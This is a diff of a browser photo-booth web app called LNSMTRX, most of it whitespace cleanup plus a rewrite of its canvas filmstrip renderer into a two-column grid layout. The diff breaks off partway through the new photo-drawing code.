@@ -32,7 +32,7 @@
       /* fluid cam height: tall on phones, shorter on desktops */
       --cam-h: clamp(220px, 46svh, 420px);
     }
- 
+
     /* ── RESET ──────────────────────────────────────── */
     *, *::before, *::after {
       margin: 0; padding: 0;
@@ -54,7 +54,7 @@
       overscroll-behavior: none;
       -webkit-font-smoothing: antialiased;
     }
- 
+
     /* ── AMBIENT BG ─────────────────────────────────── */
     .bg-marquee {
       position: fixed; top: 50%; left: 0;
@@ -73,7 +73,7 @@
       letter-spacing: -8px; padding-right: 40px;
     }
     @keyframes bg-scroll { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }
- 
+
     .grid-bg {
       position: fixed; inset: 0; z-index: -6; pointer-events: none;
       background-image:
@@ -84,7 +84,7 @@
       -webkit-mask-image: linear-gradient(to bottom, transparent, black 30%, black 70%, transparent);
       opacity: 0.18;
     }
- 
+
     .scanline {
       position: fixed; top: 0; left: 0;
       width: 100%; height: 80px;
@@ -93,7 +93,7 @@
       animation: scanline-move 8s linear infinite;
     }
     @keyframes scanline-move { 0%{transform:translateY(-80px)} 100%{transform:translateY(100vh)} }
- 
+
     /* CRT scanlines overlay */
     body::after {
       content: '';
@@ -104,7 +104,7 @@
       background-size: 100% 3px, 3px 100%;
       opacity: 0.35;
     }
- 
+
     /* ── TOP BAR ────────────────────────────────────── */
     .top-bar {
       position: fixed; top: 0; left: 0; right: 0;
@@ -125,7 +125,7 @@
       font-size: 10px; color: #555;
       letter-spacing: 2px;
     }
- 
+
     /* ── SCREENS ────────────────────────────────────── */
     .screen {
       display: none; position: absolute;
@@ -147,7 +147,7 @@
     }
     /* Welcome screen — center vertically */
     #welcome-screen.active { justify-content: center; }
- 
+
     /* ── GLASS PANEL ────────────────────────────────── */
     .glass-panel {
       position: relative;
@@ -167,7 +167,7 @@
       opacity: 0.1; filter: blur(40px);
       z-index: -1; border-radius: 40px; pointer-events: none;
     }
- 
+
     /* ── WELCOME ────────────────────────────────────── */
     .welcome-badge {
       font-family: 'Space Mono', monospace;
@@ -191,7 +191,7 @@
       /* Prevent last letter clip */
       padding-right: 0.08em; padding-bottom: 0.05em;
     }
- 
+
     /* ── BUTTONS ────────────────────────────────────── */
     .btn-liquid {
       position: relative;
@@ -219,7 +219,7 @@
     }
     .btn-liquid:hover::after { left: 100%; }
     .btn-liquid:active { transform: scale(0.96); }
- 
+
     .btn-secondary {
       background: none;
       border: 1px solid var(--gborder);
@@ -234,7 +234,7 @@
       min-height: 48px; width: 100%;
     }
     .btn-secondary:active { opacity: 0.7; }
- 
+
     /* ── SHOT SELECTOR ──────────────────────────────── */
     .shot-options { display: flex; gap: 12px; justify-content: center; }
     .shot-btn {
@@ -267,7 +267,7 @@
     }
     .shot-btn.active::after { content:'✔'; position:absolute; top:4px; right:6px; font-size:9px; }
     .shot-btn:active { transform: scale(0.94); }
- 
+
     /* ── CAMERA FRAME ───────────────────────────────── */
     .camera-frame {
       position: relative;
@@ -302,7 +302,7 @@
       animation: blink 1s infinite;
     }
     @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
- 
+
     /* ── FILTER GRID ────────────────────────────────── */
     .filter-options {
       display: grid;
@@ -327,7 +327,7 @@
       background: rgba(255,0,255,0.07);
       box-shadow: 0 0 16px rgba(255,0,255,0.12);
     }
- 
+
     /* ── LABEL INPUT ────────────────────────────────── */
     .label-input {
       width: 100%;
@@ -344,7 +344,7 @@
       border-color: var(--acid-cyan);
       box-shadow: 0 0 14px rgba(0,255,255,0.1);
     }
- 
+
     /* ── SETUP / BOOTH / STRIP CONTAINERS ───────────── */
     .setup-container, .booth-layout, .strip-layout {
       width: 100%; max-width: 480px;
@@ -352,7 +352,7 @@
       align-items: center; gap: 14px;
       margin: 0 auto;
     }
- 
+
     /* ── SCREEN HEADERS ─────────────────────────────── */
     .screen-header { text-align: center; margin-bottom: 12px; }
     .screen-title {
@@ -364,7 +364,7 @@
       font-family: 'Space Mono', monospace;
       font-size: clamp(9px, 2.5vw, 11px); color: #555;
     }
- 
+
     /* ── PROGRESS DOTS ──────────────────────────────── */
     .progress-dots { display: flex; gap: 10px; }
     .progress-dot {
@@ -382,7 +382,7 @@
       animation: pulse 0.9s infinite;
     }
     @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.35} }
- 
+
     /* ── COUNTDOWN ──────────────────────────────────── */
     .countdown-overlay {
       position: absolute; inset: 0;
@@ -400,7 +400,7 @@
       text-shadow: 0 0 40px var(--acid-cyan);
     }
     .countdown-num.show { transform: scale(1.15); }
- 
+
     /* ── FLASH ──────────────────────────────────────── */
     .flash-overlay {
       position: fixed; inset: 0; background: #fff;
@@ -408,7 +408,7 @@
     }
     .flash-overlay.flash { animation: flash-anim 0.35s ease-out; }
     @keyframes flash-anim { 0%{opacity:0} 20%{opacity:1} 100%{opacity:0} }
- 
+
     /* ── THUMBNAILS ─────────────────────────────────── */
     .thumbnails-row {
       display: flex; gap: 8px; width: 100%;
@@ -430,7 +430,7 @@
       border-color: var(--acid-green);
       box-shadow: 0 0 10px var(--acid-green);
     }
- 
+
     /* ── BOOTH STATUS ───────────────────────────────── */
     .booth-status {
       font-family: 'Space Mono', monospace;
@@ -440,7 +440,7 @@
       min-height: 20px;
       display: flex; align-items: center; justify-content: center;
     }
- 
+
     /* ── REVIEW GRID ────────────────────────────────── */
     .review-grid {
       display: grid;
@@ -468,7 +468,7 @@
       width: 100%; max-width: 480px;
       display: flex; flex-direction: column; gap: 10px;
     }
- 
+
     /* ── FILMSTRIP ──────────────────────────────────── */
     .filmstrip-wrapper {
       padding: 10px;
@@ -481,16 +481,16 @@
     }
     #filmstrip-canvas {
       display: block;
-      /* Scale canvas display to fit screen width without losing resolution */
-      max-width: min(320px, 86vw);
+      /* Grid layout is wider — scale to fit screen without losing resolution */
+      max-width: min(520px, 94vw);
       height: auto;
-      border-radius: 6px;
+      border-radius: 8px;
     }
     .strip-actions {
       width: 100%; max-width: 480px;
       display: flex; flex-direction: column; gap: 10px;
     }
- 
+
     /* ── INSTALL BANNER ─────────────────────────────── */
     #install-banner {
       position: fixed;
@@ -519,7 +519,7 @@
       min-width: 44px; min-height: 44px;
       display: flex; align-items: center; justify-content: center;
     }
- 
+
     /* ── ROTATE OVERLAY ─────────────────────────────── */
     #rotate-overlay {
       position: fixed; inset: 0;
@@ -531,14 +531,14 @@
     @media (orientation: landscape) and (max-height: 500px) {
       #rotate-overlay { display: flex; }
     }
- 
+
     /* ── SECTION LABEL ──────────────────────────────── */
     .sec-label {
       font-size: clamp(9px, 2.5vw, 11px);
       text-transform: uppercase; letter-spacing: 3px;
       margin-bottom: 8px; display: block;
     }
- 
+
     /* ── RESPONSIVE TWEAKS ──────────────────────────── */
     /* Compact cameras on very small phones */
     @media (max-height: 680px) {
@@ -547,14 +547,14 @@
       .camera-frame::before { padding-top: 62%; } /* slightly less tall */
       .screen-header { margin-bottom: 6px; }
     }
- 
+
     /* Desktop: give some breathing room */
     @media (min-width: 600px) {
       .screen.active { padding-top: calc(64px + var(--safe-top)); }
       .top-bar { height: 64px; padding-top: calc(var(--safe-top) + 16px); }
       .camera-frame::before { padding-top: 56.25%; } /* 16:9 on desktop */
     }
- 
+
     /* ── CSS FILTERS ────────────────────────────────── */
     .f-normal { filter: none; }
     .f-bw     { filter: grayscale(1) contrast(1.1); }
@@ -563,41 +563,41 @@
     .f-cool   { filter: saturate(0.8) brightness(1.05) hue-rotate(20deg) contrast(1.1); }
     .f-fade   { filter: contrast(0.85) brightness(1.15) saturate(0.7); }
     .f-vivid  { filter: saturate(1.6) contrast(1.15) brightness(0.95); }
- 
+
     /* ── HIDDEN CANVAS ──────────────────────────────── */
     #capture-canvas { display: none; }
- 
+
     /* ── MISC ───────────────────────────────────────── */
     img, video, canvas { max-width: 100%; }
     a { color: inherit; text-decoration: none; }
   </style>
 </head>
 <body>
- 
+
 <!-- Background decoration -->
 <div class="bg-marquee">
   <div class="bg-marquee-content">LNSMTRX LNSMTRX LNSMTRX LNSMTRX LNSMTRX LNSMTRX LNSMTRX LNSMTRX </div>
 </div>
 <div class="scanline"></div>
 <div class="grid-bg"></div>
- 
+
 <!-- Rotate hint (landscape on mobile) -->
 <div id="rotate-overlay">
   <div style="font-size:56px">📱</div>
   <p style="font-family:'Montserrat',sans-serif;font-weight:900;color:var(--acid-green);font-size:18px">ROTATE DEVICE</p>
   <span style="font-family:'Space Mono',monospace;font-size:11px;color:#666">LNSMTRX WORKS BEST IN PORTRAIT</span>
 </div>
- 
+
 <!-- Top bar (hidden on welcome) -->
 <div class="top-bar" id="top-bar" style="display:none">
   <div class="logo-text">LNSMTRX</div>
   <div class="shot-indicator" id="top-indicator"></div>
 </div>
- 
+
 <!-- Flash -->
 <div class="flash-overlay" id="flash-overlay"></div>
 <canvas id="capture-canvas"></canvas>
- 
+
 <!-- PWA Install Banner -->
 <div id="install-banner" class="glass-panel">
   <div class="install-text" style="flex:1">
@@ -607,7 +607,7 @@
   <button id="install-btn">INSTALL</button>
   <button id="install-dismiss">✕</button>
 </div>
- 
+
 <!-- ===== WELCOME ===== -->
 <div class="screen active" id="welcome-screen">
   <div class="glass-panel" style="text-align:center">
@@ -616,13 +616,13 @@
     <p style="font-family:'Space Mono',monospace;color:#666;margin-bottom:24px;font-size:clamp(9px,2.5vw,12px);letter-spacing:2px">
       ULTRA-RES DIGITAL PHOTO SYSTEM<br>EST. 1972 // REBORN 2024
     </p>
- 
+
     <div style="text-align:left;margin-bottom:22px;border-left:2px solid var(--acid-green);padding-left:16px">
       <p style="font-size:clamp(11px,3vw,13px);margin-bottom:8px;color:#ccc"><span style="color:var(--acid-green)">01.</span> SELECT SESSION QUANTITY</p>
       <p style="font-size:clamp(11px,3vw,13px);margin-bottom:8px;color:#ccc"><span style="color:var(--acid-green)">02.</span> CONFIGURE VISUAL FILTERS</p>
       <p style="font-size:clamp(11px,3vw,13px);color:#ccc"><span style="color:var(--acid-green)">03.</span> EXECUTE CAPTURE SEQUENCE</p>
     </div>
- 
+
     <div style="margin-bottom:24px">
       <span class="sec-label" style="color:var(--acid-cyan)">Shot Count</span>
       <div class="shot-options">
@@ -631,26 +631,26 @@
         <button class="shot-btn" data-shots="8">08</button>
       </div>
     </div>
- 
+
     <button class="btn-liquid" id="start-btn">Initialize</button>
   </div>
 </div>
- 
+
 <!-- ===== SETUP ===== -->
 <div class="screen" id="setup-screen">
   <div class="screen-header">
     <h2 class="screen-title">CALIBRATE</h2>
     <p class="screen-sub">Adjust optics &amp; style</p>
   </div>
- 
+
   <div class="setup-container">
     <div class="camera-frame" id="setup-frame">
       <div class="cam-label"><span class="dot"></span>LIVE REC</div>
       <video id="preview-video" autoplay muted playsinline></video>
     </div>
- 
+
     <button class="btn-secondary" id="flip-cam-btn">⟳ Flip Lens</button>
- 
+
     <div style="width:100%">
       <span class="sec-label" style="color:var(--acid-pink)">Visual Core</span>
       <div class="filter-options">
@@ -663,21 +663,21 @@
         <button class="filter-btn" data-filter="f-vivid">CRISP</button>
       </div>
     </div>
- 
+
     <div style="width:100%">
       <span class="sec-label" style="color:var(--acid-cyan)">Session ID</span>
       <input type="text" class="label-input" id="strip-label" placeholder="ENTER LABEL..." maxlength="40" autocomplete="off" autocorrect="off">
     </div>
- 
+
     <button class="btn-liquid" id="go-booth-btn" style="background:var(--acid-green);color:#000">Enter Booth</button>
   </div>
 </div>
- 
+
 <!-- ===== BOOTH ===== -->
 <div class="screen" id="booth-screen">
   <div class="booth-layout">
     <div class="progress-dots" id="progress-dots"></div>
- 
+
     <div class="camera-frame" style="max-width:480px">
       <div class="cam-label"><span class="dot"></span>LIVE REC</div>
       <video id="booth-video" autoplay muted playsinline></video>
@@ -685,13 +685,13 @@
         <span class="countdown-num" id="countdown-num">3</span>
       </div>
     </div>
- 
+
     <div class="booth-status" id="booth-status">READY_FOR_INPUT</div>
     <div class="thumbnails-row" id="thumbnails-row"></div>
     <button class="btn-liquid" id="start-sequence-btn" style="background:var(--acid-pink);color:#fff">Execute Capture</button>
   </div>
 </div>
- 
+
 <!-- ===== REVIEW ===== -->
 <div class="screen" id="review-screen">
   <div class="screen-header">
@@ -704,7 +704,7 @@
     <button class="btn-secondary" id="retake-btn" style="color:#ff4444;border-color:#ff4444">Discard All</button>
   </div>
 </div>
- 
+
 <!-- ===== FILMSTRIP ===== -->
 <div class="screen" id="strip-screen">
   <div class="strip-layout">
@@ -712,24 +712,24 @@
       <h2 class="screen-title">LNSMTRX OUTPUT</h2>
       <p class="screen-sub">HD Digital Strip</p>
     </div>
- 
+
     <div class="filmstrip-wrapper">
       <canvas id="filmstrip-canvas"></canvas>
     </div>
- 
+
     <div class="strip-actions">
       <button class="btn-liquid" id="download-btn" style="background:var(--acid-green);color:#000">Download Output</button>
       <button class="btn-secondary" id="restart-btn">New Session</button>
     </div>
   </div>
 </div>
- 
+
 <script>
   // ── PWA ────────────────────────────────────────────────
   if ('serviceWorker' in navigator) {
     window.addEventListener('load', () => navigator.serviceWorker.register('/sw.js').catch(() => {}));
   }
- 
+
   let deferredPrompt = null;
   window.addEventListener('beforeinstallprompt', e => {
     e.preventDefault(); deferredPrompt = e;
@@ -756,7 +756,7 @@
       b.classList.add('visible');
     }, 4000);
   }
- 
+
   // ── STATE ──────────────────────────────────────────────
   const state = {
     numShots: 4, filter: 'f-normal', label: '',
@@ -764,7 +764,7 @@
     currentShot: 0, shooting: false,
     camW: 1280, camH: 720
   };
- 
+
   const filterMap = {
     'f-normal': null,
     'f-bw':    'grayscale(1) contrast(1.1)',
@@ -774,7 +774,7 @@
     'f-fade':  'contrast(0.85) brightness(1.15) saturate(0.7)',
     'f-vivid': 'saturate(1.6) contrast(1.15) brightness(0.95)'
   };
- 
+
   // ── NAV ────────────────────────────────────────────────
   function showScreen(id) {
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
@@ -783,7 +783,7 @@
     scr.scrollTop = 0;
     document.getElementById('top-bar').style.display = id === 'welcome-screen' ? 'none' : 'flex';
   }
- 
+
   // ── WELCOME ────────────────────────────────────────────
   document.querySelectorAll('.shot-btn').forEach(btn => {
     btn.addEventListener('click', () => {
@@ -792,14 +792,14 @@
       state.numShots = parseInt(btn.dataset.shots);
     });
   });
- 
+
   document.getElementById('start-btn').addEventListener('click', async () => {
     await initCamera('preview-video');
     buildProgressDots(); buildThumbnails();
     showScreen('setup-screen');
     document.getElementById('top-indicator').textContent = `${state.numShots} SHOTS`;
   });
- 
+
   // ── CAMERA ────────────────────────────────────────────
   async function initCamera(videoId) {
     if (state.stream) state.stream.getTracks().forEach(t => t.stop());
@@ -811,15 +811,15 @@
       };
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       state.stream = stream;
- 
+
       const track = stream.getVideoTracks()[0];
       const s = track.getSettings();
       state.camW = s.width  || 1280;
       state.camH = s.height || 720;
- 
+
       const vid = document.getElementById(videoId);
       vid.srcObject = stream;
- 
+
       // Wait for video metadata so videoWidth/Height are accurate
       await new Promise(res => {
         if (vid.readyState >= 1) { res(); return; }
@@ -827,25 +827,25 @@
       });
       if (vid.videoWidth)  state.camW = vid.videoWidth;
       if (vid.videoHeight) state.camH = vid.videoHeight;
- 
+
       applyVideoMirror(vid);
       return stream;
     } catch (e) {
       alert('Camera access denied. Please allow camera permission in your browser settings and reload.');
     }
   }
- 
+
   function applyVideoMirror(vid) {
     vid.style.transform = state.facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
   }
- 
+
   document.getElementById('flip-cam-btn').addEventListener('click', async () => {
     state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';
     await initCamera('preview-video');
     const vid = document.getElementById('preview-video');
     vid.className = ''; vid.classList.add(state.filter);
   });
- 
+
   // ── FILTER ────────────────────────────────────────────
   document.querySelectorAll('.filter-btn').forEach(btn => {
     btn.addEventListener('click', () => {
@@ -856,7 +856,7 @@
       vid.className = ''; vid.classList.add(state.filter);
     });
   });
- 
+
   // ── GO TO BOOTH ───────────────────────────────────────
   document.getElementById('go-booth-btn').addEventListener('click', async () => {
     state.label = document.getElementById('strip-label').value.trim();
@@ -868,7 +868,7 @@
     showScreen('booth-screen');
     document.getElementById('top-indicator').textContent = `0 / ${state.numShots}`;
   });
- 
+
   // ── BOOTH HELPERS ─────────────────────────────────────
   function buildProgressDots() {
     const c = document.getElementById('progress-dots');
@@ -890,19 +890,19 @@
       row.appendChild(img);
     }
   }
- 
+
   // ── SHOOT SEQUENCE ────────────────────────────────────
   document.getElementById('start-sequence-btn').addEventListener('click', () => {
     if (state.shooting) return;
     document.getElementById('start-sequence-btn').style.display = 'none';
     startSequence();
   });
- 
+
   async function startSequence() {
     state.shooting = true;
     state.currentShot = 0; state.photos = [];
     updateDots();
- 
+
     for (let i = 0; i < state.numShots; i++) {
       state.currentShot = i; updateDots();
       document.getElementById('top-indicator').textContent = `${i} / ${state.numShots}`;
@@ -913,7 +913,7 @@
       flashEffect();
       await delay(550);
     }
- 
+
     state.shooting = false;
     document.getElementById('booth-status').textContent = 'ALL DONE ✦';
     document.getElementById('top-indicator').textContent = `${state.numShots} / ${state.numShots}`;
@@ -921,13 +921,13 @@
     buildReviewGrid();
     showScreen('review-screen');
   }
- 
+
   async function countdown() {
     const numEl = document.getElementById('countdown-num');
     const overlay = document.getElementById('countdown-overlay');
     overlay.style.opacity = '1';
     document.getElementById('booth-status').textContent = '';
- 
+
     for (let n = 3; n >= 1; n--) {
       numEl.textContent = n;
       numEl.classList.remove('show');
@@ -940,25 +940,25 @@
     }
     overlay.style.opacity = '0';
   }
- 
+
   async function capturePhoto(index) {
     const video = document.getElementById('booth-video');
     const canvas = document.getElementById('capture-canvas');
- 
+
     // Wait until the video frame is truly ready (max 2s)
     let attempts = 0;
     while ((video.readyState < 2 || video.videoWidth === 0) && attempts < 20) {
       await delay(100); attempts++;
     }
     if (video.videoWidth === 0) { console.error('Camera not ready'); return; }
- 
+
     const w = video.videoWidth;
     const h = video.videoHeight;
     canvas.width = w; canvas.height = h;
- 
+
     const ctx = canvas.getContext('2d');
     const cf  = filterMap[state.filter];
- 
+
     ctx.save();
     if (state.facingMode === 'user') {
       // Correct mirror for selfie cam
@@ -968,24 +968,24 @@
     ctx.drawImage(video, 0, 0, w, h);
     ctx.filter = 'none';
     ctx.restore();
- 
+
     // High quality capture
     const dataURL = canvas.toDataURL('image/jpeg', 0.97);
     state.photos[index] = dataURL;
- 
+
     const thumb = document.getElementById(`thumb-${index}`);
     if (thumb) { thumb.src = dataURL; thumb.classList.add('taken'); }
     const dot = document.getElementById(`dot-${index}`);
     if (dot) { dot.classList.remove('current'); dot.classList.add('done'); }
   }
- 
+
   function flashEffect() {
     const fl = document.getElementById('flash-overlay');
     fl.classList.remove('flash');
     void fl.offsetWidth; // force reflow
     fl.classList.add('flash');
   }
- 
+
   function updateDots() {
     for (let i = 0; i < state.numShots; i++) {
       const dot = document.getElementById(`dot-${i}`);
@@ -995,7 +995,7 @@
       else if (i === state.currentShot) dot.classList.add('current');
     }
   }
- 
+
   // ── REVIEW ────────────────────────────────────────────
   function buildReviewGrid() {
     const grid = document.getElementById('review-grid');
@@ -1011,12 +1011,12 @@
       grid.appendChild(wrap);
     });
   }
- 
+
   document.getElementById('make-strip-btn').addEventListener('click', () => {
     showScreen('strip-screen');
     setTimeout(renderFilmstrip, 120);
   });
- 
+
   document.getElementById('retake-btn').addEventListener('click', async () => {
     state.photos = []; state.currentShot = 0;
     buildProgressDots(); buildThumbnails();
@@ -1028,178 +1028,259 @@
     document.getElementById('top-indicator').textContent = `0 / ${state.numShots}`;
     showScreen('booth-screen');
   });
- 
-  // ── FILMSTRIP RENDER ──────────────────────────────────
+
+  // ── FILMSTRIP RENDER — 2-per-row grid layout ─────────
   function renderFilmstrip() {
     const canvas = document.getElementById('filmstrip-canvas');
     const ctx    = canvas.getContext('2d');
- 
-    // Internal render at 2× for sharpness; CSS scales it down to fit
-    const SCALE    = 2;
-    const STRIP_W  = 280 * SCALE;
-    const PHOTO_W  = 218 * SCALE;
-    const PHOTO_X  = (STRIP_W - PHOTO_W) / 2;
-    const PERF_SZ  = 13 * SCALE;
-    const PERF_M   = 8  * SCALE;
-    const TOP_PAD  = 26 * SCALE;
-    const BOT_PAD  = (state.label ? 70 : 46) * SCALE;
-    const BETWEEN  = 10 * SCALE;
- 
-    // Pre-load all images to get their real aspect ratios first
+
+    // 2× internal resolution for sharpness; CSS max-width scales it down
+    const SCALE   = 2;
+    const COLS    = 2;                        // photos per row
+    const ROWS    = Math.ceil(state.numShots / COLS);
+
+    const OUTER_PAD  = 24 * SCALE;           // canvas edge padding
+    const GAP        = 14 * SCALE;           // gap between photos
+    const BORDER_W   = 3  * SCALE;           // visible border thickness
+    const CORNER_R   = 6  * SCALE;           // photo corner radius
+    const BOT_PAD    = (state.label ? 72 : 52) * SCALE;
+    const HEADER_H   = 52 * SCALE;           // top branding bar
+
+    // Fixed photo size — 4:3 aspect, looks great in a grid
+    const PHOTO_W = 240 * SCALE;
+    const PHOTO_H = Math.round(PHOTO_W * 3 / 4);
+
+    const STRIP_W = OUTER_PAD * 2 + COLS * PHOTO_W + (COLS - 1) * GAP;
+    const STRIP_H = HEADER_H + OUTER_PAD + ROWS * PHOTO_H + (ROWS - 1) * GAP + OUTER_PAD + BOT_PAD;
+
+    canvas.width  = STRIP_W;
+    canvas.height = STRIP_H;
+
+    // ── Background — deep black with subtle radial glow
+    ctx.fillStyle = '#050505';
+    ctx.fillRect(0, 0, STRIP_W, STRIP_H);
+
+    const bgGlow = ctx.createRadialGradient(STRIP_W/2, STRIP_H/2, 0, STRIP_W/2, STRIP_H/2, STRIP_W * 0.8);
+    bgGlow.addColorStop(0,   'rgba(0,255,255,0.04)');
+    bgGlow.addColorStop(0.5, 'rgba(204,255,0,0.02)');
+    bgGlow.addColorStop(1,   'rgba(0,0,0,0)');
+    ctx.fillStyle = bgGlow;
+    ctx.fillRect(0, 0, STRIP_W, STRIP_H);
+
+    // ── Outer frame border (full canvas)
+    const frameGrad = ctx.createLinearGradient(0, 0, STRIP_W, STRIP_H);
+    frameGrad.addColorStop(0,   'rgba(204,255,0,0.6)');
+    frameGrad.addColorStop(0.5, 'rgba(0,255,255,0.6)');
+    frameGrad.addColorStop(1,   'rgba(255,0,255,0.6)');
+    ctx.strokeStyle = frameGrad;
+    ctx.lineWidth = BORDER_W * 1.5;
+    roundRect(ctx, BORDER_W, BORDER_W, STRIP_W - BORDER_W*2, STRIP_H - BORDER_W*2, CORNER_R * 2);
+    ctx.stroke();
+
+    // ── Inner frame line (double border effect)
+    ctx.strokeStyle = 'rgba(255,255,255,0.06)';
+    ctx.lineWidth = 1 * SCALE;
+    roundRect(ctx, BORDER_W*3, BORDER_W*3, STRIP_W - BORDER_W*6, STRIP_H - BORDER_W*6, CORNER_R * 1.5);
+    ctx.stroke();
+
+    // ── Header branding bar
+    const hGrad = ctx.createLinearGradient(0, 0, STRIP_W, 0);
+    hGrad.addColorStop(0,   'rgba(204,255,0,0.08)');
+    hGrad.addColorStop(0.5, 'rgba(0,255,255,0.05)');
+    hGrad.addColorStop(1,   'rgba(255,0,255,0.08)');
+    ctx.fillStyle = hGrad;
+    ctx.fillRect(0, 0, STRIP_W, HEADER_H);
+
+    // Header divider line
+    const hdGrad = ctx.createLinearGradient(0, 0, STRIP_W, 0);
+    hdGrad.addColorStop(0,   'transparent');
+    hdGrad.addColorStop(0.2, 'rgba(204,255,0,0.5)');
+    hdGrad.addColorStop(0.8, 'rgba(0,255,255,0.5)');
+    hdGrad.addColorStop(1,   'transparent');
+    ctx.strokeStyle = hdGrad;
+    ctx.lineWidth = 1 * SCALE;
+    ctx.beginPath(); ctx.moveTo(0, HEADER_H); ctx.lineTo(STRIP_W, HEADER_H); ctx.stroke();
+
+    // Brand name in header
+    ctx.fillStyle = 'rgba(204,255,0,0.9)';
+    ctx.font = `900 ${14*SCALE}px 'Montserrat', sans-serif`;
+    ctx.textAlign = 'center';
+    ctx.letterSpacing = `${3*SCALE}px`;
+    ctx.fillText('LNSMTRX', STRIP_W / 2, HEADER_H * 0.62);
+
+    // Version tag in header
+    ctx.fillStyle = 'rgba(255,255,255,0.25)';
+    ctx.font = `${6*SCALE}px 'Space Mono', monospace`;
+    ctx.fillText('CHROME EDITION // DIGITAL STRIP', STRIP_W / 2, HEADER_H * 0.88);
+
+    // ── Pre-load all images
     const loadAll = state.photos.map(src => new Promise(res => {
       const img = new Image();
       img.onload  = () => res(img);
       img.onerror = () => res(null);
       img.src = src;
     }));
- 
+
     Promise.all(loadAll).then(images => {
-      // Per-photo height = PHOTO_W × native aspect ratio → zero distortion
-      const photoHeights = images.map(img => {
-        if (!img) return Math.round(PHOTO_W * 3 / 4);
-        return Math.round(PHOTO_W * (img.naturalHeight / img.naturalWidth));
-      });
- 
-      const totalPH = photoHeights.reduce((a, b) => a + b, 0);
-      const STRIP_H = TOP_PAD + totalPH + (state.numShots - 1) * BETWEEN + BOT_PAD;
- 
-      canvas.width  = STRIP_W;
-      canvas.height = STRIP_H;
- 
-      // ── Background
-      ctx.fillStyle = '#050505';
-      ctx.fillRect(0, 0, STRIP_W, STRIP_H);
- 
-      // ── Edge vignette
-      const eg = ctx.createLinearGradient(0, 0, STRIP_W, 0);
-      eg.addColorStop(0,    'rgba(0,0,0,0.75)');
-      eg.addColorStop(0.13, 'rgba(0,0,0,0)');
-      eg.addColorStop(0.87, 'rgba(0,0,0,0)');
-      eg.addColorStop(1,    'rgba(0,0,0,0.75)');
-      ctx.fillStyle = eg; ctx.fillRect(0, 0, STRIP_W, STRIP_H);
- 
-      // ── Sprocket holes
-      const sxL = PERF_M + PERF_SZ / 2;
-      const sxR = STRIP_W - PERF_M - PERF_SZ / 2;
-      const sSp = (STRIP_H - TOP_PAD) / (state.numShots * 2 + 2);
-      function drawSprocket(x, y) {
-        ctx.fillStyle = '#111';
-        ctx.strokeStyle = 'rgba(204,255,0,0.12)';
-        ctx.lineWidth = 1 * SCALE;
-        ctx.beginPath(); ctx.arc(x, y, PERF_SZ / 2, 0, Math.PI * 2);
-        ctx.fill(); ctx.stroke();
-      }
-      for (let i = 0; i <= state.numShots * 2 + 1; i++) {
-        const sy = TOP_PAD / 2 + i * sSp;
-        drawSprocket(sxL, sy); drawSprocket(sxR, sy);
-      }
- 
-      // ── Edge lines
-      ctx.strokeStyle = 'rgba(255,255,255,0.06)'; ctx.lineWidth = 1 * SCALE;
-      [PERF_M * 2 + PERF_SZ, STRIP_W - PERF_M * 2 - PERF_SZ].forEach(x => {
-        ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, STRIP_H); ctx.stroke();
-      });
- 
-      // ── Photos
-      let curY = TOP_PAD;
+      // ── Draw each photo in a 2-column grid
       images.forEach((img, i) => {
-        const PH = photoHeights[i];
- 
-        // Shadow
-        ctx.shadowColor = 'rgba(0,0,0,0.9)'; ctx.shadowBlur = 10 * SCALE;
-        ctx.fillStyle = '#000'; ctx.fillRect(PHOTO_X, curY, PHOTO_W, PH);
-        ctx.shadowBlur = 0;
- 
+        const col  = i % COLS;
+        const row  = Math.floor(i / COLS);
+        const px   = OUTER_PAD + col * (PHOTO_W + GAP);
+        const py   = HEADER_H + OUTER_PAD + row * (PHOTO_H + GAP);
+
+        // ── Photo drop shadow
+        ctx.shadowColor = 'rgba(0,0,0,0.85)';
+        ctx.shadowBlur  = 14 * SCALE;
+        ctx.shadowOffsetX = 3 * SCALE;
+        ctx.shadowOffsetY = 4 * SCALE;
+        ctx.fillStyle = '#000';
+        roundRect(ctx, px, py, PHOTO_W, PHOTO_H, CORNER_R);
+        ctx.fill();
+        ctx.shadowColor = 'transparent'; ctx.shadowBlur = 0;
+        ctx.shadowOffsetX = 0; ctx.shadowOffsetY = 0;
+
+        // ── Photo image (object-fit: cover)
         if (img) {
           ctx.save();
-          ctx.beginPath(); ctx.rect(PHOTO_X, curY, PHOTO_W, PH); ctx.clip();
- 
-          // object-fit:cover — crop to fill without distorting
+          roundRect(ctx, px, py, PHOTO_W, PHOTO_H, CORNER_R);
+          ctx.clip();
           const iR = img.naturalWidth / img.naturalHeight;
-          const tR = PHOTO_W / PH;
+          const tR = PHOTO_W / PHOTO_H;
           let sx = 0, sy = 0, sw = img.naturalWidth, sh = img.naturalHeight;
-          if (iR > tR) { sw = img.naturalHeight * tR; sx = (img.naturalWidth - sw) / 2; }
-          else         { sh = img.naturalWidth / tR;  sy = (img.naturalHeight - sh) / 2; }
-          ctx.drawImage(img, sx, sy, sw, sh, PHOTO_X, curY, PHOTO_W, PH);
+          if (iR > tR) { sw = img.naturalHeight * tR; sx = (img.naturalWidth  - sw) / 2; }
+          else         { sh = img.naturalWidth  / tR; sy = (img.naturalHeight - sh) / 2; }
+          ctx.drawImage(img, sx, sy, sw, sh, px, py, PHOTO_W, PHOTO_H);
           ctx.restore();
         }
- 
-        // Vignette
+
+        // ── Vignette over photo
         const vig = ctx.createRadialGradient(
-          PHOTO_X + PHOTO_W/2, curY + PH/2, PHOTO_W * 0.1,
-          PHOTO_X + PHOTO_W/2, curY + PH/2, PHOTO_W * 0.9
+          px + PHOTO_W/2, py + PHOTO_H/2, PHOTO_W * 0.15,
+          px + PHOTO_W/2, py + PHOTO_H/2, PHOTO_W * 0.85
         );
         vig.addColorStop(0, 'rgba(0,0,0,0)');
-        vig.addColorStop(1, 'rgba(0,0,0,0.42)');
-        ctx.fillStyle = vig; ctx.fillRect(PHOTO_X, curY, PHOTO_W, PH);
- 
-        // Border
-        ctx.strokeStyle = 'rgba(255,255,255,0.1)'; ctx.lineWidth = 1 * SCALE;
-        ctx.strokeRect(PHOTO_X, curY, PHOTO_W, PH);
- 
-        // Frame number
